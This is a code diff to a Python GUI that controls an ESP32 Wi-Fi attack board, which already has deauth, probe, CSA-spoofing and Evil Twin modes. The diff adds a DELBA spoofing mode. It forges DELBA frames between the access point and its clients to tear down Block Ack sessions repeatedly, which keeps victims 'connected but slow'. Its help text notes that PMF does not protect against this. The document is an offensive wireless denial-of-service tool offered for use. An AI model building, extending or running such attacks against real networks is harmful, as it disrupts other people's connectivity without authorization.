@@ -47,6 +47,7 @@ MENU = [
     ("deauth", "Deauth 攻击"),
     ("probe", "Probe 攻击"),
     ("csa", "CSA 欺骗"),
+    ("delba", "DELBA 欺骗"),
     ("evil", "Evil Twin"),
     ("status", "设备状态"),
     ("log", "日志"),
@@ -58,6 +59,14 @@ DEAUTH_MODES = [
     ("all", "全部 AP", False, "对扫描到的全部 AP 轮流发包（自动跟随各 AP 信道）"),
     ("only", "只打勾选", True, "白名单：只打弹窗里勾选的 AP"),
     ("except", "排除勾选", True, "黑名单：打全部 AP，但排除弹窗里勾选的"),
+]
+
+DELBA_REASONS = [
+    "37 - 不再使用该机制",
+    "1 - 未指定原因",
+    "32 - QoS 相关（未指定）",
+    "38 - QoS 相关（对端未指定）",
+    "39 - 对端不支持该机制",
 ]
 
 AP_COLUMNS = ("pick", "idx", "ssid", "bssid", "band", "ch", "rssi", "enc")
@@ -306,6 +315,8 @@ class DeautherApp:
         self.csa_mode_var = tk.StringVar(
             value="自动：2.4G AP → 随机 5G 信道，5G AP → 随机 2.4G 信道；循环攻击直到停止")
         self.csa_label = None
+        self.delba_reason_var = tk.StringVar(value=DELBA_REASONS[0])
+        self.delba_label = None
 
         root.title("ESP32 Wireless Attack 上位机")
         root.geometry("1040x700")
@@ -363,6 +374,7 @@ class DeautherApp:
             self.pages[key] = self._build_mode_page(key, label, needs_pick, hint)
         self.pages["probe"] = self._build_probe_page()
         self.pages["csa"] = self._build_csa_page()
+        self.pages["delba"] = self._build_delba_page()
         self.pages["evil"] = self._build_evil_page()
         self.pages["status"] = self._build_status_page()
         self.pages["log"] = self._build_log_page()
@@ -507,6 +519,57 @@ class DeautherApp:
                   "• count 从 5 递减到 1、每 100 ms 一轮，同时发广播与单播 Action 帧 + 带 CSA IE 的 Beacon；\n"
                   "• 每轮结束后在新信道用同 BSSID/SSID/RSN 的克隆 beacon 顶 5 秒，然后自动开始下一轮；\n"
                   "• 循环直到“停止”；底栏 CSA 字段显示 idle / announce / hold，帧数看 csaf。"),
+            justify="left",
+        ).pack(anchor="w", pady=(12, 0))
+        return page
+
+    def _build_delba_page(self):
+        page = self._make_page()
+        ttk.Label(page, text="DELBA 欺骗（拆除 Block Ack 会话）", font=("", 12, "bold")).pack(
+            anchor="w", pady=(10, 4))
+        ttk.Label(
+            page,
+            text="伪造 AP 发 DELBA（Category 3 / Action 2），把客户端的块确认会话拆掉："
+                 "链路还在，聚合没了，吞吐量掉到单帧确认。DELBA 不是 robust 管理帧，PMF 不校验。",
+            foreground="#777777", wraplength=900, justify="left",
+        ).pack(anchor="w", pady=(0, 8))
+
+        bar = ttk.Frame(page)
+        bar.pack(fill="x", pady=(0, 6))
+        btn = ttk.Button(bar, text="扫描 AP", width=11, command=self.scan, state="disabled")
+        btn.pack(side="left")
+        self.scan_btns["delba"] = btn
+        tbtn = ttk.Button(bar, text="选择目标…", width=13,
+                          command=lambda: self.open_targets(False), state="disabled")
+        tbtn.pack(side="left", padx=6)
+        self.target_btns["delba"] = tbtn
+        self.delba_label = ttk.Label(bar, text="未扫描")
+        self.delba_label.pack(side="left", padx=10)
+
+        params = ttk.Frame(page)
+        params.pack(fill="x", pady=(4, 6))
+        ttk.Label(params, text="reason code：").pack(side="left")
+        ttk.Combobox(params, textvariable=self.delba_reason_var, values=DELBA_REASONS,
+                     state="readonly", width=26).pack(side="left")
+        ttk.Label(params, text="   （37 是真实 AP 拆会话时最常用的值）",
+                  foreground="#555555").pack(side="left")
+
+        actions = ttk.Frame(page)
+        actions.pack(fill="x", pady=(6, 4))
+        ttk.Button(actions, text="开始 DELBA", width=14,
+                   command=self.start_delba).pack(side="left")
+        ttk.Button(actions, text="停止", width=10,
+                   command=self.delba_stop).pack(side="left", padx=8)
+
+        ttk.Label(
+            page,
+            text=("说明：\n"
+                  "• 选一个 AP 即可，攻击板会停在该 AP 的信道上；\n"
+                  "• 先听：从 QoS 数据帧 / BA 控制帧 / ADDBA 里认出客户端和它在用的 TID；\n"
+                  "• 再发：对每个已知客户端，按 TID 单播 DELBA（AP→STA 与 STA→AP 两个方向都伪造）；"
+                  "还没听到客户端时退化为广播 DELBA；\n"
+                  "• 客户端重新建会话（ADDBA）会被再拆一次，所以链路会一直“连着但很慢”；\n"
+                  "• 底栏 DELBA 字段：on/off、帧数 delbaf、客户端数 delbac、TID 位图 delbat。"),
             justify="left",
         ).pack(anchor="w", pady=(12, 0))
         return page
@@ -819,6 +882,21 @@ class DeautherApp:
     def csa_stop(self):
         self._send("CSASTOP")
 
+    def start_delba(self):
+        if not self._require_link():
+            return
+        if not self.networks:
+            messagebox.showinfo("提示", "先点“扫描 AP”。")
+            return
+        if self.single_index is None:
+            messagebox.showerror("DELBA 参数无效", "先在“选择目标…”里选一个 AP。")
+            return
+        reason = self.delba_reason_var.get().split(" ")[0]
+        self._send(f"DELBA {self.single_index} {reason}")
+
+    def delba_stop(self):
+        self._send("DELBASTOP")
+
     def stop(self):
         self._send("STOP")
 
@@ -888,13 +966,16 @@ class DeautherApp:
                 f"模式：{mode}    Deauth 帧：{payload.get('deauth_frames', '-')}    "
                 f"Probe 帧：{payload.get('probe_frames', '-')}    "
                 f"reason：{payload.get('reason', '-')}    CSA：{payload.get('csa', '-')} "
-                f"({payload.get('csaf', '-')} 帧)    网络：{payload.get('networks', '-')}"
+                f"({payload.get('csaf', '-')} 帧)    DELBA：{payload.get('delba', '-')} "
+                f"({payload.get('delbaf', '-')} 帧 / TID {payload.get('delbat', '-')})    "
+                f"网络：{payload.get('networks', '-')}"
                 f"    堆：{payload.get('heap', '-')}{band_hint}"
             )
             self.status_text.configure(state="normal")
             self.status_text.delete("1.0", "end")
             for key in ("mode", "eliminated", "deauth_frames", "probe_frames", "networks", "creds",
-                        "heap", "ui", "caps", "ch", "rx", "rxm"):
+                        "heap", "ui", "caps", "ch", "rx", "rxm",
+                        "delba", "delbaf", "delbac", "delbat", "delbab", "delbar", "delbtr"):
                 if key in payload:
                     self.status_text.insert("end", f"{key:<14}{payload[key]}\n")
             self.status_text.configure(state="disabled")
